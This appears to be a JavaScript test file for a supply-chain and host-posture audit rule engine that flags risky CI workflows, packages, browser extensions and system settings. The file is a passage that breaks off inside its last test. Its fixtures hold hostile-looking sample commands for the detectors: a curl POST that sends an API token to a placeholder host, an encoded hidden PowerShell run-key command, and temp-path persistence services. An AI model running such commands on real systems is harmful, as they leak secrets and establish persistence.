import { join } from "node:path";
import { fileURLToPath } from "node:url";

import { PackageURL } from "packageurl-js";
import { assert, describe, it } from "poku";

import { githubActionsParser } from "../../helpers/ciParsers/githubActions.js";
import {
  auditBom,
  formatAnnotations,
  hasCriticalFindings,
} from "./auditBom.js";
import { evaluateRule, evaluateRules, loadRules } from "./ruleEngine.js";

const __dirname = fileURLToPath(new URL(".", import.meta.url));
const RULES_DIR = join(__dirname, "..", "..", "..", "data", "rules");
const WORKFLOWS_DIR = join(
  __dirname,
  "..",
  "..",
  "..",
  "test",
  "data",
  "workflows",
);

function makeBom(components = [], workflows = [], formulationComponents = []) {
  const formulationEntry = {};
  if (formulationComponents.length) {
    formulationEntry.components = formulationComponents;
  }
  if (workflows.length) {
    formulationEntry.workflows = workflows;
  }
  return {
    bomFormat: "CycloneDX",
    specVersion: "1.6",
    serialNumber: "urn:uuid:test-bom",
    metadata: {
      tools: {
        components: [
          {
            type: "application",
            name: "cdxgen",
            version: "11.0.0",
            "bom-ref": "pkg:npm/%40cyclonedx/cdxgen@11.0.0",
          },
        ],
      },
      component: {
        name: "test-project",
        type: "application",
        "bom-ref": "pkg:npm/test-project@1.0.0",
      },
    },
    components,
    formulation:
      workflows.length || formulationComponents.length
        ? [formulationEntry]
        : undefined,
  };
}

function makeComponent(name, version, properties) {
  return {
    type: "library",
    name,
    version,
    purl: `pkg:npm/${name}@${version}`,
    "bom-ref": `pkg:npm/${name}@${version}`,
    properties: properties.map(([k, v]) => ({ name: k, value: v })),
  };
}

function makeChromeExtensionComponent(name, version, properties) {
  const purl = new PackageURL(
    "chrome-extension",
    null,
    name,
    version,
  ).toString();
  return {
    type: "application",
    name,
    version,
    purl,
    "bom-ref": purl,
    properties: properties.map(([k, v]) => ({ name: k, value: v })),
  };
}

function makeBomFromWorkflowFixture(filename) {
  const workflowFile = join(WORKFLOWS_DIR, filename);
  const result = githubActionsParser.parse([workflowFile], {
    specVersion: 1.7,
  });
  return makeBom([], result.workflows, result.components);
}

describe("loadRules", () => {
  it("should load built-in rules from the data/rules directory", async () => {
    const rules = await loadRules(RULES_DIR);
    assert.ok(rules.length > 0, "Should load at least one rule");
    for (const rule of rules) {
      assert.ok(rule.id, "Each rule must have an id");
      assert.ok(rule.condition, "Each rule must have a condition");
      assert.ok(rule.message, "Each rule must have a message");
      assert.ok(
        ["critical", "high", "medium", "low"].includes(rule.severity),
        `Rule ${rule.id} severity must be valid`,
      );
    }
  });

  it("should return empty array for non-existent directory", async () => {
    const rules = await loadRules("/tmp/non-existent-rules-dir-12345");
    assert.deepStrictEqual(rules, []);
  });

  it("should load rules with all required fields", async () => {
    const rules = await loadRules(RULES_DIR);
    const ciRules = rules.filter((r) => r.category === "ci-permission");
    assert.ok(ciRules.length > 0, "Should have CI permission rules");
    const depRules = rules.filter((r) => r.category === "dependency-source");
    assert.ok(depRules.length > 0, "Should have dependency source rules");
    const intRules = rules.filter((r) => r.category === "package-integrity");
    assert.ok(intRules.length > 0, "Should have package integrity rules");
    const chromeExtensionRules = rules.filter(
      (r) => r.category === "chrome-extension",
    );
    assert.ok(chromeExtensionRules.length > 0, "Should have extension rules");
    const containerRiskRules = rules.filter(
      (r) => r.category === "container-risk",
    );
    assert.ok(
      containerRiskRules.length > 0,
      "Should have container risk rules",
    );
  });
});

describe("evaluateRule", () => {
  it("should detect unpinned action with write permissions (CI-001)", async () => {
    const rules = await loadRules(RULES_DIR);
    const rule = rules.find((r) => r.id === "CI-001");
    assert.ok(rule, "CI-001 rule should exist");

    const bom = makeBom([
      makeComponent("actions/setup-node", "v3", [
        ["cdx:github:action:isShaPinned", "false"],
        ["cdx:github:workflow:hasWritePermissions", "true"],
        ["cdx:github:action:uses", "actions/setup-node@v3"],
        ["cdx:github:action:versionPinningType", "tag"],
      ]),
    ]);

    const findings = await evaluateRule(rule, bom);
    assert.ok(findings.length > 0, "Should find unpinned action");
    assert.strictEqual(findings[0].ruleId, "CI-001");
    assert.strictEqual(findings[0].severity, "high");
  });

  it("should not flag SHA-pinned actions for CI-001", async () => {
    const rules = await loadRules(RULES_DIR);
    const rule = rules.find((r) => r.id === "CI-001");

    const bom = makeBom([
      makeComponent("actions/setup-node", "v3", [
        ["cdx:github:action:isShaPinned", "true"],
        ["cdx:github:workflow:hasWritePermissions", "true"],
        ["cdx:github:action:uses", "actions/setup-node@abc123"],
      ]),
    ]);

    const findings = await evaluateRule(rule, bom);
    assert.strictEqual(
      findings.length,
      0,
      "SHA-pinned action should not trigger",
    );
  });

  it("should detect npm install script from non-registry source (PKG-001)", async () => {
    const rules = await loadRules(RULES_DIR);
    const rule = rules.find((r) => r.id === "PKG-001");
    assert.ok(rule, "PKG-001 rule should exist");

    const bom = makeBom([
      makeComponent("sketchy-pkg", "1.0.0", [
        ["cdx:npm:hasInstallScript", "true"],
        ["cdx:npm:isRegistryDependency", "false"],
      ]),
    ]);

    const findings = await evaluateRule(rule, bom);
    assert.ok(findings.length > 0, "Should detect install script risk");
    assert.strictEqual(findings[0].severity, "high");
  });

  it("should detect OIDC token issuance to a non-official action (CI-002)", async () => {
    const rules = await loadRules(RULES_DIR);
    const rule = rules.find((r) => r.id === "CI-002");
    assert.ok(rule, "CI-002 rule should exist");

    const bom = makeBom(
      [],
      [],
      [
        {
          type: "application",
          name: "deploy-action",
          version: "v1",
          purl: "pkg:github/vendor/deploy-action@v1",
          "bom-ref": "pkg:github/vendor/deploy-action@v1",
          properties: [
            {
              name: "cdx:github:action:uses",
              value: "vendor/deploy-action@v1",
            },
            { name: "cdx:github:workflow:hasIdTokenWrite", value: "true" },
            { name: "cdx:github:job:hasIdTokenWrite", value: "true" },
            { name: "cdx:actions:isOfficial", value: "false" },
            { name: "cdx:actions:isVerified", value: "false" },
          ],
        },
      ],
    );

    const findings = await evaluateRule(rule, bom);
    assert.ok(findings.length > 0, "Should detect third-party OIDC exposure");
    assert.deepStrictEqual(findings[0].attackTechniques, ["T1528"]);
  });

  it("should detect npm name mismatch (INT-002)", async () => {
    const rules = await loadRules(RULES_DIR);
    const rule = rules.find((r) => r.id === "INT-002");
    assert.ok(rule, "INT-002 rule should exist");

    const bom = makeBom([
      makeComponent("suspicious-pkg", "1.0.0", [
        [
          "cdx:npm:nameMismatchError",
          "Expected 'real-pkg', found 'suspicious-pkg'",
        ],
      ]),
    ]);

    const findings = await evaluateRule(rule, bom);
    assert.ok(findings.length > 0, "Should detect name mismatch");
    assert.strictEqual(findings[0].severity, "high");
  });

  it("should detect yanked Ruby gem (INT-004)", async () => {
    const rules = await loadRules(RULES_DIR);
    const rule = rules.find((r) => r.id === "INT-004");
    assert.ok(rule, "INT-004 rule should exist");

    const bom = makeBom([
      {
        type: "library",
        name: "bad-gem",
        version: "0.5.0",
        purl: "pkg:gem/bad-gem@0.5.0",
        "bom-ref": "pkg:gem/bad-gem@0.5.0",
        properties: [{ name: "cdx:gem:yanked", value: "true" }],
      },
    ]);

    const findings = await evaluateRule(rule, bom);
    assert.ok(findings.length > 0, "Should detect yanked gem");
    assert.strictEqual(findings[0].severity, "high");
  });

  it("should detect Cargo git dependency without immutable pin (PKG-007)", async () => {
    const rules = await loadRules(RULES_DIR);
    const rule = rules.find((r) => r.id === "PKG-007");
    assert.ok(rule, "PKG-007 rule should exist");

    const bom = makeBom([
      {
        type: "library",
        name: "git-crate",
        version: "git+https://example.com/git-crate",
        purl: "pkg:cargo/git-crate@git+https://example.com/git-crate",
        "bom-ref": "pkg:cargo/git-crate@git+https://example.com/git-crate",
        properties: [
          { name: "cdx:cargo:git", value: "https://example.com/git-crate" },
          { name: "cdx:cargo:dependencyKind", value: "runtime" },
        ],
      },
    ]);

    const findings = await evaluateRule(rule, bom);
    assert.ok(findings.length > 0, "Should detect mutable Cargo git source");
    assert.strictEqual(findings[0].severity, "high");
  });

  it("should detect Cargo local path dependency (PKG-008)", async () => {
    const rules = await loadRules(RULES_DIR);
    const rule = rules.find((r) => r.id === "PKG-008");
    assert.ok(rule, "PKG-008 rule should exist");

    const bom = makeBom([
      {
        type: "library",
        name: "path-crate",
        version: "path+../path-crate",
        purl: "pkg:cargo/path-crate@path+../path-crate",
        "bom-ref": "pkg:cargo/path-crate@path+../path-crate",
        properties: [
          { name: "cdx:cargo:path", value: "../path-crate" },
          { name: "cdx:cargo:dependencyKind", value: "build" },
        ],
      },
    ]);

    const findings = await evaluateRule(rule, bom);
    assert.ok(findings.length > 0, "Should detect Cargo path dependency");
    assert.strictEqual(findings[0].severity, "high");
  });

  it("should detect yanked Cargo crate (INT-010)", async () => {
    const rules = await loadRules(RULES_DIR);
    const rule = rules.find((r) => r.id === "INT-010");
    assert.ok(rule, "INT-010 rule should exist");

    const bom = makeBom([
      {
        type: "library",
        name: "yanked-crate",
        version: "1.2.3",
        purl: "pkg:cargo/yanked-crate@1.2.3",
        "bom-ref": "pkg:cargo/yanked-crate@1.2.3",
        properties: [
          { name: "cdx:cargo:yanked", value: "true" },
          { name: "cdx:cargo:publisher", value: "publisher" },
        ],
      },
    ]);

    const findings = await evaluateRule(rule, bom);
    assert.ok(findings.length > 0, "Should detect yanked Cargo crate");
    assert.strictEqual(findings[0].severity, "high");
  });

  it("should detect native Cargo build surface in formulation (INT-011)", async () => {
    const rules = await loadRules(RULES_DIR);
    const rule = rules.find((r) => r.id === "INT-011");
    assert.ok(rule, "INT-011 rule should exist");

    const bom = makeBom(
      [],
      [],
      [
        {
          type: "application",
          name: "cargo-demo",
          version: "config",
          "bom-ref": "urn:cdxgen:formulation:cargo:test",
          properties: [
            { name: "SrcFile", value: "/tmp/Cargo.toml" },
            { name: "cdx:rust:buildTool", value: "cargo" },
            { name: "cdx:cargo:hasNativeBuild", value: "true" },
            { name: "cdx:cargo:buildScript", value: "/tmp/build.rs" },
          ],
        },
      ],
    );

    const findings = await evaluateRule(rule, bom);
    assert.ok(findings.length > 0, "Should detect native Cargo build surface");
    assert.strictEqual(findings[0].severity, "medium");
  });

  it("should detect mutable Cargo toolchain setup for native builds (INT-012)", async () => {
    const rules = await loadRules(RULES_DIR);
    const rule = rules.find((r) => r.id === "INT-012");
    assert.ok(rule, "INT-012 rule should exist");

    const bom = makeBom(
      [
        {
          type: "application",
          name: "rust-toolchain",
          version: "stable",
          purl: "pkg:github/dtolnay/rust-toolchain@stable",
          "bom-ref": "pkg:github/dtolnay/rust-toolchain@stable",
          properties: [
            { name: "cdx:github:action:ecosystem", value: "cargo" },
            { name: "cdx:github:action:role", value: "toolchain" },
            {
              name: "cdx:github:action:versionPinningType",
              value: "tag",
            },
            {
              name: "cdx:github:action:uses",
              value: "dtolnay/rust-toolchain@stable",
            },
          ],
        },
      ],
      [],
      [
        {
          type: "application",
          name: "cargo-demo",
          version: "config",
          "bom-ref": "urn:cdxgen:formulation:cargo:int012",
          properties: [
            { name: "SrcFile", value: "/tmp/Cargo.toml" },
            { name: "cdx:rust:buildTool", value: "cargo" },
            { name: "cdx:cargo:hasNativeBuild", value: "true" },
            { name: "cdx:cargo:buildScript", value: "/tmp/build.rs" },
          ],
        },
      ],
    );

    const findings = await evaluateRule(rule, bom);
    assert.ok(
      findings.length > 0,
      "Should detect mutable Cargo toolchain setup for native builds",
    );
    assert.strictEqual(findings[0].severity, "medium");
  });

  it("should detect Cargo build workflow steps against native build surfaces (INT-013)", async () => {
    const rules = await loadRules(RULES_DIR);
    const rule = rules.find((r) => r.id === "INT-013");
    assert.ok(rule, "INT-013 rule should exist");

    const bom = makeBom(
      [
        {
          type: "application",
          name: "cargo build",
          "bom-ref": "urn:cdxgen:workflow:cargo-build",
          properties: [
            { name: "cdx:github:step:type", value: "run" },
            { name: "cdx:github:step:usesCargo", value: "true" },
            {
              name: "cdx:github:step:cargoSubcommands",
              value: "build,test",
            },
            {
              name: "cdx:github:step:command",
              value: "cargo build --workspace && cargo test --workspace",
            },
          ],
        },
      ],
      [],
      [
        {
          type: "application",
          name: "cargo-demo",
          version: "config",
          "bom-ref": "urn:cdxgen:formulation:cargo:int013",
          properties: [
            { name: "SrcFile", value: "/tmp/Cargo.toml" },
            { name: "cdx:rust:buildTool", value: "cargo" },
            { name: "cdx:cargo:hasNativeBuild", value: "true" },
            {
              name: "cdx:cargo:buildScriptCapabilities",
              value: "process-execution, network-access",
            },
            {
              name: "cdx:cargo:nativeBuildIndicators",
              value: "bindgen, openssl-sys",
            },
          ],
        },
      ],
    );

    const findings = await evaluateRule(rule, bom);
    assert.ok(
      findings.length > 0,
      "Should detect Cargo build workflow steps against native build surfaces",
    );
    assert.strictEqual(findings[0].severity, "medium");
  });

  it("should detect broad host access extensions (CHE-001)", async () => {
    const rules = await loadRules(RULES_DIR);
    const rule = rules.find((r) => r.id === "CHE-001");
    assert.ok(rule, "CHE-001 rule should exist");
    const bom = makeBom([
      makeChromeExtensionComponent("example-extension", "1.0.0", [
        ["cdx:chrome-extension:permissions", "<all_urls>, storage"],
      ]),
    ]);
    const findings = await evaluateRule(rule, bom);
    assert.ok(findings.length > 0, "Should detect broad host access extension");
    assert.strictEqual(findings[0].severity, "high");
  });

  it("should detect web request interception permissions (CHE-002)", async () => {
    const rules = await loadRules(RULES_DIR);
    const rule = rules.find((r) => r.id === "CHE-002");
    assert.ok(rule, "CHE-002 rule should exist");
    const bom = makeBom([
      makeChromeExtensionComponent("proxy-extension", "1.0.0", [
        [
          "cdx:chrome-extension:permissions",
          "storage, webRequest, webRequestBlocking",
        ],
      ]),
    ]);
    const findings = await evaluateRule(rule, bom);
    assert.ok(findings.length > 0, "Should detect network interception risk");
    assert.strictEqual(findings[0].severity, "critical");
  });

  it("should detect broad host code injection capability (CHE-006)", async () => {
    const rules = await loadRules(RULES_DIR);
    const rule = rules.find((r) => r.id === "CHE-006");
    assert.ok(rule, "CHE-006 rule should exist");
    const bom = makeBom([
      makeChromeExtensionComponent("injector-extension", "1.0.0", [
        ["cdx:chrome-extension:hostPermissions", "*://*/*"],
        ["cdx:chrome-extension:capability:codeInjection", "true"],
        ["cdx:chrome-extension:capabilities", "network, codeInjection"],
      ]),
    ]);
    const findings = await evaluateRule(rule, bom);
    assert.ok(findings.length > 0, "Should detect code-injection risk");
    assert.strictEqual(findings[0].severity, "critical");
  });

  it("should detect AI-assistant code-injection extensions (CHE-008)", async () => {
    const rules = await loadRules(RULES_DIR);
    const rule = rules.find((r) => r.id === "CHE-008");
    assert.ok(rule, "CHE-008 rule should exist");
    const bom = makeBom([
      makeChromeExtensionComponent("ai-assistant-extension", "1.0.0", [
        [
          "cdx:chrome-extension:hostPermissions",
          "https://chat.openai.com/*, https://claude.ai/*",
        ],
        ["cdx:chrome-extension:capability:codeInjection", "true"],
        ["cdx:chrome-extension:capabilities", "network, codeInjection"],
      ]),
    ]);
    const findings = await evaluateRule(rule, bom);
    assert.ok(findings.length > 0, "Should detect AI assistant takeover risk");
    assert.strictEqual(findings[0].severity, "high");
  });

  it("should return empty findings when no components match", async () => {
    const rules = await loadRules(RULES_DIR);
    const rule = rules.find((r) => r.id === "CI-001");

    const bom = makeBom([]);
    const findings = await evaluateRule(rule, bom);
    assert.strictEqual(findings.length, 0, "No components means no findings");
  });

  it("should detect unprotected BitLocker drive (OBOM-WIN-001)", async () => {
    const rules = await loadRules(RULES_DIR);
    const rule = rules.find((r) => r.id === "OBOM-WIN-001");
    assert.ok(rule, "OBOM-WIN-001 rule should exist");

    const bom = makeBom([
      makeComponent("disk-c", "C:", [
        ["cdx:osquery:category", "windows_bitlocker_info"],
        ["protection_status", "0"],
        ["encryption_method", "XTS-AES 128"],
      ]),
    ]);

    const findings = await evaluateRule(rule, bom);
    assert.ok(
      findings.length > 0,
      "Should detect disabled BitLocker protection",
    );
    assert.strictEqual(findings[0].severity, "high");
  });

  it("should detect suspicious Linux systemd unit path (OBOM-LNX-001)", async () => {
    const rules = await loadRules(RULES_DIR);
    const rule = rules.find((r) => r.id === "OBOM-LNX-001");
    assert.ok(rule, "OBOM-LNX-001 rule should exist");

    const bom = makeBom([
      {
        type: "data",
        name: "evil.service",
        version: "",
        description: "",
        purl: "pkg:swid/evil-service",
        "bom-ref": "pkg:swid/evil-service",
        properties: [
          { name: "cdx:osquery:category", value: "systemd_units" },
          { name: "fragment_path", value: "/tmp/evil.service" },
          { name: "source_path", value: "/tmp/evil.service" },
        ],
      },
    ]);

    const findings = await evaluateRule(rule, bom);
    assert.ok(findings.length > 0, "Should detect systemd unit from temp path");
    assert.strictEqual(findings[0].severity, "high");
  });

  it("should detect hidden Unicode in workflow files (CI-009)", async () => {
    const rules = await loadRules(RULES_DIR);
    const rule = rules.find((r) => r.id === "CI-009");
    assert.ok(rule, "CI-009 rule should exist");

    const bom = makeBom(
      [],
      [
        {
          "bom-ref": "workflow-1",
          properties: [
            { name: "cdx:github:workflow:name", value: "release" },
            {
              name: "cdx:github:workflow:file",
              value: ".github/workflows/release.yml",
            },
            { name: "cdx:github:workflow:hasHiddenUnicode", value: "true" },
            {
              name: "cdx:github:workflow:hiddenUnicodeCodePoints",
              value: "U+202E",
            },
            {
              name: "cdx:github:workflow:hiddenUnicodeLineNumbers",
              value: "4",
            },
            {
              name: "cdx:github:workflow:hiddenUnicodeInComments",
              value: "true",
            },
          ],
        },
      ],
    );

    const findings = await evaluateRule(rule, bom);
    assert.ok(findings.length > 0, "Should detect hidden Unicode workflow");
    assert.strictEqual(findings[0].severity, "medium");
  });

  it("should detect external reusable workflows inheriting secrets (CI-011)", async () => {
    const rules = await loadRules(RULES_DIR);
    const rule = rules.find((r) => r.id === "CI-011");
    assert.ok(rule, "CI-011 rule should exist");

    const bom = makeBom(
      [],
      [],
      [
        {
          type: "application",
          name: "release.yml",
          version: "main",
          purl: "pkg:github/octo-org/reusable-release/release.yml@main",
          "bom-ref": "pkg:github/octo-org/reusable-release/release.yml@main",
          properties: [
            {
              name: "cdx:github:workflow:file",
              value: ".github/workflows/release.yml",
            },
            {
              name: "cdx:github:reusableWorkflow:uses",
              value:
                "octo-org/reusable-release/.github/workflows/release.yml@main",
            },
            {
              name: "cdx:github:reusableWorkflow:isExternal",
              value: "true",
            },
            {
              name: "cdx:github:reusableWorkflow:secretsInherit",
              value: "true",
            },
            {
              name: "cdx:github:reusableWorkflow:isShaPinned",
              value: "false",
            },
          ],
        },
      ],
    );

    const findings = await evaluateRule(rule, bom);
    assert.ok(findings.length > 0, "Should detect risky reusable workflow");
    assert.ok(findings[0].message.includes("inherits caller secrets"));
  });

  it("should detect high-risk triggers on self-hosted runners (CI-013)", async () => {
    const rules = await loadRules(RULES_DIR);
    const rule = rules.find((r) => r.id === "CI-013");
    assert.ok(rule, "CI-013 rule should exist");

    const bom = makeBom(
      [],
      [],
      [
        {
          type: "application",
          name: "checkout",
          version: "v4",
          purl: "pkg:github/actions/checkout@v4",
          "bom-ref": "pkg:github/actions/checkout@v4",
          properties: [
            {
              name: "cdx:github:workflow:file",
              value: ".github/workflows/triage.yml",
            },
            {
              name: "cdx:github:workflow:hasIssueCommentTrigger",
              value: "true",
            },
            { name: "cdx:github:job:isSelfHosted", value: "true" },
            { name: "cdx:github:job:name", value: "triage" },
            { name: "cdx:github:job:runner", value: "self-hosted,linux" },
          ],
        },
      ],
    );

    const findings = await evaluateRule(rule, bom);
    assert.ok(findings.length > 0, "Should detect self-hosted high-risk path");
  });

  it("should detect privileged runner-state mutation (CI-014)", async () => {
    const rules = await loadRules(RULES_DIR);
    const rule = rules.find((r) => r.id === "CI-014");
    assert.ok(rule, "CI-014 rule should exist");

    const bom = makeBom(
      [],
      [],
      [
        {
          type: "application",
          name: "Persist env",
          "bom-ref": "workflow-step-2",
          properties: [
            {
              name: "cdx:github:workflow:file",
              value: ".github/workflows/release.yml",
            },
            { name: "cdx:github:step:type", value: "run" },
            { name: "cdx:github:step:mutatesRunnerState", value: "true" },
            { name: "cdx:github:step:runnerStateTargets", value: "GITHUB_ENV" },
            {
              name: "cdx:github:step:command",
              value: 'echo "PUBLISH=1" >> $GITHUB_ENV',
            },
            {
              name: "cdx:github:workflow:hasWritePermissions",
              value: "true",
            },
            { name: "cdx:github:job:name", value: "release" },
          ],
        },
      ],
    );

    const findings = await evaluateRule(rule, bom);
    assert.ok(findings.length > 0, "Should detect runner-state mutation");
    assert.deepStrictEqual(findings[0].attackTactics, [
      "TA0003",
      "TA0004",
      "TA0005",
    ]);
  });

  it("should detect outbound commands that reference sensitive context (CI-015)", async () => {
    const rules = await loadRules(RULES_DIR);
    const rule = rules.find((r) => r.id === "CI-015");
    assert.ok(rule, "CI-015 rule should exist");

    const bom = makeBom(
      [],
      [],
      [
        {
          type: "application",
          name: "Post data",
          "bom-ref": "workflow-step-3",
          properties: [
            {
              name: "cdx:github:workflow:file",
              value: ".github/workflows/release.yml",
            },
            { name: "cdx:github:step:type", value: "run" },
            {
              name: "cdx:github:step:hasOutboundNetworkCommand",
              value: "true",
            },
            {
              name: "cdx:github:step:outboundNetworkTools",
              value: "curl",
            },
            {
              name: "cdx:github:step:referencesSensitiveContext",
              value: "true",
            },
            {
              name: "cdx:github:step:sensitiveContextRefs",
              value: "env:API_TOKEN",
            },
            {
              name: "cdx:github:step:likelyExfiltration",
              value: "true",
            },
            {
              name: "cdx:github:step:exfiltrationIndicators",
              value: "auth-header,state-changing-method",
            },
            {
              name: "cdx:github:step:command",
              value:
                'curl -X POST https://example.invalid/upload -H "Authorization: Bearer $API_TOKEN"',
            },
          ],
        },
      ],
    );

    const findings = await evaluateRule(rule, bom);
    assert.ok(findings.length > 0, "Should detect likely exfiltration path");
    assert.deepStrictEqual(findings[0].attackTechniques, ["T1048"]);
  });

  it("should detect privileged reusable workflows that accept caller secrets (CI-016)", async () => {
    const rules = await loadRules(RULES_DIR);
    const rule = rules.find((r) => r.id === "CI-016");
    assert.ok(rule, "CI-016 rule should exist");

    const bom = makeBom(
      [],
      [
        {
          "bom-ref": "workflow-call-release",
          name: "Reusable workflow risky producer",
          properties: [
            {
              name: "cdx:github:workflow:name",
              value: "Reusable workflow risky producer",
            },
            {
              name: "cdx:github:workflow:file",
              value: ".github/workflows/reusable-release.yml",
            },
            {
              name: "cdx:github:workflow:isWorkflowCallProducer",
              value: "true",
            },
            {
              name: "cdx:github:workflow:workflowCallSecrets",
              value: "release_token",
            },
            {
              name: "cdx:github:workflow:hasWritePermissions",
              value: "true",
            },
            {
              name: "cdx:github:workflow:writeScopes",
              value: "contents",
            },
          ],
        },
      ],
    );

    const findings = await evaluateRule(rule, bom);
    assert.ok(
      findings.length > 0,
      "Should detect privileged reusable workflow secrets interface",
    );
    assert.strictEqual(findings[0].severity, "high");
  });

  it("should detect privileged reusable workflows that export caller-influenced outputs (CI-017)", async () => {
    const rules = await loadRules(RULES_DIR);
    const rule = rules.find((r) => r.id === "CI-017");
    assert.ok(rule, "CI-017 rule should exist");

    const bom = makeBom(
      [],
      [
        {
          "bom-ref": "workflow-call-build",
          name: "Reusable workflow risky producer",
          properties: [
            {
              name: "cdx:github:workflow:name",
              value: "Reusable workflow risky producer",
            },
            {
              name: "cdx:github:workflow:file",
              value: ".github/workflows/reusable-release.yml",
            },
            {
              name: "cdx:github:workflow:isWorkflowCallProducer",
              value: "true",
            },
            {
              name: "cdx:github:workflow:workflowCallInputs",
              value: "release_tag",
            },
            {
              name: "cdx:github:workflow:workflowCallOutputs",
              value: "image_tag",
            },
            {
              name: "cdx:github:workflow:hasWritePermissions",
              value: "true",
            },
          ],
        },
      ],
    );

    const findings = await evaluateRule(rule, bom);
    assert.ok(
      findings.length > 0,
      "Should detect risky reusable workflow outputs interface",
    );
    assert.strictEqual(findings[0].severity, "medium");
  });

  it("should detect legacy token-based package publishing in workflows (CI-010)", async () => {
    const rules = await loadRules(RULES_DIR);
    const rule = rules.find((r) => r.id === "CI-010");
    assert.ok(rule, "CI-010 rule should exist");

    const bom = makeBom(
      [],
      [],
      [
        {
          "bom-ref": "workflow-step-1",
          name: "Publish npm",
          properties: [
            {
              name: "cdx:github:workflow:file",
              value: ".github/workflows/release.yml",
            },
            { name: "cdx:github:step:isPublishCommand", value: "true" },
            { name: "cdx:github:step:publishEcosystem", value: "npm" },
            { name: "cdx:github:step:usesLegacyPublishToken", value: "true" },
            {
              name: "cdx:github:step:legacyPublishTokenSources",
              value: "cli-flag,env:NPM_TOKEN",
            },
            {
              name: "cdx:github:step:command",
              value: "npm publish --token=$" + "{NPM_TOKEN}",
            },
          ],
          type: "application",
        },
      ],
    );

    const findings = await evaluateRule(rule, bom);
    assert.ok(findings.length > 0, "Should detect legacy publish token usage");
    assert.strictEqual(findings[0].severity, "medium");
  });

  it("should detect hidden Unicode in README files (INT-008)", async () => {
    const rules = await loadRules(RULES_DIR);
    const rule = rules.find((r) => r.id === "INT-008");
    assert.ok(rule, "INT-008 rule should exist");

    const bom = makeBom(
      [],
      [],
      [
        {
          "bom-ref": "file:README.md",
          name: "README.md",
          properties: [
            { name: "SrcFile", value: "README.md" },
            { name: "cdx:file:kind", value: "readme" },
            { name: "cdx:file:hasHiddenUnicode", value: "true" },
            { name: "cdx:file:hiddenUnicodeCodePoints", value: "U+200B" },
            { name: "cdx:file:hiddenUnicodeLineNumbers", value: "2" },
            { name: "cdx:file:hiddenUnicodeInComments", value: "true" },
          ],
          type: "file",
        },
      ],
    );

    const findings = await evaluateRule(rule, bom);
    assert.ok(findings.length > 0, "Should detect hidden Unicode README");
    assert.strictEqual(findings[0].severity, "medium");
  });

  it("should detect heuristic implicit-permissions risk for sensitive high-risk workflows (CI-021)", async () => {
    const rules = await loadRules(RULES_DIR);
    const rule = rules.find((r) => r.id === "CI-021");
    assert.ok(rule, "CI-021 rule should exist");

    const bom = makeBomFromWorkflowFixture(
      "heuristic-implicit-permissions-sensitive.yml",
    );

    const findings = await evaluateRule(rule, bom);
    assert.ok(
      findings.length > 0,
      "Should detect heuristic implicit-permissions risk",
    );
    assert.strictEqual(findings[0].severity, "medium");
    assert.match(findings[0].message, /Heuristic review/);
  });

  it("should detect root authorized_keys without restrictions (OBOM-LNX-003)", async () => {
    const rules = await loadRules(RULES_DIR);
    const rule = rules.find((r) => r.id === "OBOM-LNX-003");
    assert.ok(rule, "OBOM-LNX-003 rule should exist");

    const bom = makeBom([
      {
        type: "data",
        name: "root",
        version: "ssh-rsa",
        description: "",
        purl: "pkg:swid/root-authorized-keys",
        "bom-ref": "pkg:swid/root-authorized-keys",
        properties: [
          { name: "cdx:osquery:category", value: "authorized_keys_snapshot" },
          { name: "key_file", value: "/root/.ssh/authorized_keys" },
          { name: "options", value: "" },
        ],
      },
    ]);

    const findings = await evaluateRule(rule, bom);
    assert.ok(
      findings.length > 0,
      "Should detect unrestricted root authorized_keys entry",
    );
    assert.strictEqual(findings[0].severity, "medium");
  });

  it("should detect degraded Windows Security Center posture (OBOM-WIN-002)", async () => {
    const rules = await loadRules(RULES_DIR);
    const rule = rules.find((r) => r.id === "OBOM-WIN-002");
    assert.ok(rule, "OBOM-WIN-002 rule should exist");

    const bom = makeBom([
      makeComponent("Poor", "Poor", [
        ["cdx:osquery:category", "windows_security_center"],
      ]),
    ]);

    const findings = await evaluateRule(rule, bom);
    assert.ok(findings.length > 0, "Should detect unhealthy security center");
    assert.strictEqual(findings[0].severity, "high");
  });

  it("should detect suspicious Windows run key command (OBOM-WIN-003)", async () => {
    const rules = await loadRules(RULES_DIR);
    const rule = rules.find((r) => r.id === "OBOM-WIN-003");
    assert.ok(rule, "OBOM-WIN-003 rule should exist");

    const bom = makeBom([
      {
        type: "data",
        name: "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater",
        version: "",
        description:
          "powershell -enc SQBFAFgAIAAoAEkAbgB2AG8AawBlACkA -w hidden",
        purl: "pkg:swid/windows-run-key-updater",
        "bom-ref": "pkg:swid/windows-run-key-updater",
        properties: [
          { name: "cdx:osquery:category", value: "windows_run_keys" },
        ],
      },
    ]);

    const findings = await evaluateRule(rule, bom);
    assert.ok(findings.length > 0, "Should detect suspicious run key command");
    assert.strictEqual(findings[0].severity, "critical");
  });

  it("should detect weak macOS ALF posture (OBOM-MAC-001)", async () => {
    const rules = await loadRules(RULES_DIR);
    const rule = rules.find((r) => r.id === "OBOM-MAC-001");
    assert.ok(rule, "OBOM-MAC-001 rule should exist");

    const bom = makeBom([
      makeComponent("alf", "0", [
        ["cdx:osquery:category", "alf"],
        ["stealth_enabled", "0"],
      ]),
    ]);

    const findings = await evaluateRule(rule, bom);
    assert.ok(findings.length > 0, "Should detect weak firewall posture");
    assert.strictEqual(findings[0].severity, "high");
  });

  it("should detect launchd temp-path persistence (OBOM-MAC-002)", async () => {
    const rules = await loadRules(RULES_DIR);
    const rule = rules.find((r) => r.id === "OBOM-MAC-002");
    assert.ok(rule, "OBOM-MAC-002 rule should exist");

    const bom = makeBom([
      {
        type: "data",
        name: "com.bad.agent",
        version: "",
        description: "",
        purl: "pkg:swid/mac-launchd-bad-agent",
        "bom-ref": "pkg:swid/mac-launchd-bad-agent",
        properties: [
          { name: "cdx:osquery:category", value: "launchd_services" },
          { name: "path", value: "/tmp/com.bad.agent.plist" },
          { name: "program", value: "/tmp/bad-agent" },
          { name: "run_at_load", value: "true" },
        ],
      },
    ]);

    const findings = await evaluateRule(rule, bom);
    assert.ok(findings.length > 0, "Should detect suspicious launchd service");
    assert.strictEqual(findings[0].severity, "critical");
  });

  it("should detect risky macOS ALF user path exception (OBOM-MAC-003)", async () => {
    const rules = await loadRules(RULES_DIR);
    const rule = rules.find((r) => r.id === "OBOM-MAC-003");
    assert.ok(rule, "OBOM-MAC-003 rule should exist");

    const bom = makeBom([
      {
        type: "data",
        name: "/Users/alice/Downloads/remote-control.app",
        version: "1",
        description: "",
        purl: "pkg:swid/mac-alf-exception",
        "bom-ref": "pkg:swid/mac-alf-exception",
